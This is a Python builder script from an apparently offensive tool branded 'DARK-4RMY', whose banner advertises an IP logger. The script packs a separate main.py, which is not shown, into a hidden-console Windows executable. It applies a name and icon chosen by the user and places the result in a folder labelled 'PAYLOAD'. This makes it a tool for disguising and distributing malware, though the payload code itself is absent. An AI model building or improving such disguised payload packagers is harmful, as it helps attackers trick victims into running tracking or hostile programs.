# Author : cybermad

import os
import os
import shutil
from PIL import Image
from io import BytesIO
from pystyle import Colorate, Colors

def darkarmy():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_white,r"""
   ___  ___   ___  __ __    ____ ___  __  _____  __
  / _ \/ _ | / _ \/ //_/___/ / // _ \/  |/  /\ \/ /
 / // / __ |/ , _/ ,< /___/_  _/ , _/ /|_/ /  \  / 
/____/_/ |_/_/|_/_/|_|     /_//_/|_/_/  /_/   /_/  
                              
            [VERSION] V2
            [PATCHED] + IPLOGGER + BUGFIX
                              
            [GITHUB] github.com/madanokr001        
            [AUTHOR] cybermad
            [REVOLT] rvlt.gg/HVhg0t9x 
          """))

def convert(image_path):
    try:
        img = Image.open(image_path) 
        icon_path = "whiterose.ico"
        img.save(icon_path, "ICO") 
        return icon_path
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white,"FAILD"))
        return None

def build():
    icon_path = convert(icon)  
    if icon_path is None:
        print(Colorate.Horizontal(Colors.red_to_white,"FAILD"))
        return

    os.system(f'pyinstaller --onefile --clean --name {exe} --icon {icon_path} --noconsole main.py')

    exepath = f"dist/{exe}.exe"
    lib = "PAYLOAD"

    if not os.path.exists(lib):
        os.makedirs(lib)

    if os.path.exists(exepath):
        shutil.copy(exepath, os.path.join(lib, f"{exe}.exe"))

    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists(f"{exe}.spec"):
        os.remove(f"{exe}.spec")

    if os.path.exists(icon_path):
        os.remove(icon_path)

    print(Colorate.Horizontal(Colors.blue_to_cyan,"Done."))
    input()

if __name__ == "__main__":
    darkarmy()
    exe = input(Colorate.Horizontal(Colors.red_to_white,"""
[DARKARMY] ENTER THE EXE FILE NAME
                        
┌──(root@DARK-4RMY)-[/home/root]
└─# """))

    icon = input(Colorate.Horizontal(Colors.red_to_white,"""
[DARKARMY] ENTER THE ICON IMAGE FILE PATH (LOCAL FILE PATH)
                 
┌──(root@DARK-4RMY)-[/home/root]
└─# """))
    
    build()    
